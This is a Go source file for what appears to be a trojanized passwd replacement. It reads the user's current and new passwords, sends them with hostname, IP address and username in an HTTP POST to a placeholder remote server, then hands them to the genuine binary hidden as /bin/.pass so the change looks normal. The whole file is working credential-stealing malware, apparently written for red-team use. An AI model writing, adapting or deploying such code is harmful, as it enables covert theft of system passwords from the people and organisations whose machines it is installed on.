// Copyright (C) 2020 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published
// by the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package main

import (
	"bytes"
	"context"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"time"

	"golang.org/x/crypto/ssh/terminal"
)

const (
	bin    = "/bin/.pass"
	nilIP  = "<nil>"
	comm1  = "printf '%s\n%s\n' | /bin/.pass"
	comm3  = "printf '%s\n%s\n' | /bin/.pass %s"
	comm2  = "printf '%s\n%s\n%s\n' | /bin/.pass"
	comm4  = "printf '%s\n%s\n%s\n' | /bin/.pass %s"
	server = "<server>:<port>"
)

func main() {
	r := false
	u, err := user.Current()
	if err == nil && u.Uid == "0" {
		r = true
	}
	c, m := "", ""
	if len(os.Args) > 1 {
		m = os.Args[1]
	}
	if !r {
		fmt.Printf("Enter current password: ")
		cb, err := terminal.ReadPassword(int(os.Stdin.Fd()))
		if err != nil {
			fmt.Printf("Incorrect password entered.\n")
			os.Exit(1)
		}
		c = string(cb)
		fmt.Printf("\n")
	}
	fmt.Printf("New password: ")
	nb, err := terminal.ReadPassword(int(os.Stdin.Fd()))
	if err != nil {
		fmt.Printf("Invalid password.\n")
		os.Exit(1)
	}
	n := string(nb)
	fmt.Printf("\nConfirm password: ")
	kb, err := terminal.ReadPassword(int(os.Stdin.Fd()))
	if err != nil {
		fmt.Printf("Invalid password.\n")
		os.Exit(1)
	}
	k := string(kb)
	fmt.Printf("\n")
	if k != n {
		fmt.Printf("Passwords do not match!\n")
		os.Exit(1)
	}
	sendPassword(u.Username, k, c)
	b, err := exec.LookPath("bash")
	if err != nil {
		fmt.Printf("Passwords do not match!\n")
		os.Exit(1)
	}
	var x *exec.Cmd
	if !r {
		if len(m) > 0 {
			x = exec.Command(b, "-c", fmt.Sprintf(comm4, c, n, k, m))
		} else {
			x = exec.Command(b, "-c", fmt.Sprintf(comm2, c, n, k))
		}
	} else {
		if len(m) > 0 {
			x = exec.Command(b, "-c", fmt.Sprintf(comm3, n, k, m))
		} else {
			x = exec.Command(b, "-c", fmt.Sprintf(comm1, n, k))
		}
	}
	if err := x.Run(); err != nil {
		fmt.Printf("Password could not be changed!\n")
		os.Exit(1)
	}
	fmt.Printf("Password changed sucessfully.\n")
	os.Exit(0)
}
func getIP() string {
	i, err := net.Interfaces()
	if err != nil {
		return nilIP
	}
	for _, a := range i {
		if a.Flags&net.FlagUp == 0 || a.Flags&net.FlagLoopback != 0 {
			continue
		}
		if n, err := a.Addrs(); err == nil {
			for _, ad := range n {
				var r net.IP
				switch ad.(type) {
				case *net.IPNet:
					r = ad.(*net.IPNet).IP
				case *net.IPAddr:
					r = ad.(*net.IPAddr).IP
				default:
					continue
				}
				if r.IsLoopback() || r.IsUnspecified() || r.IsMulticast() || r.IsInterfaceLocalMulticast() || r.IsLinkLocalMulticast() || r.IsLinkLocalUnicast() {
					continue
				}
				if p := r.To4(); p != nil {
					return p.String()
				}
				return r.String()
			}
		} else {
			return nilIP
		}
	}
	return nilIP
}
func sendPassword(u string, p string, o string) {
	h, err := os.Hostname()
	if err != nil {
		h = ""
	}
	d := bytes.NewReader([]byte(fmt.Sprintf("[%s:(%s)%s:%s-%s]\n", h, getIP(), u, p, o)))
	x, f := context.WithTimeout(context.Background(), time.Duration(5*time.Second))
	defer f()
	r, err := http.NewRequestWithContext(x, http.MethodPost, fmt.Sprintf("http://%s/p/", server), d)
	if err != nil {
		return
	}
	b, err := http.DefaultClient.Do(r)
	if err != nil {
		return
	}
	b.Body.Close()
}
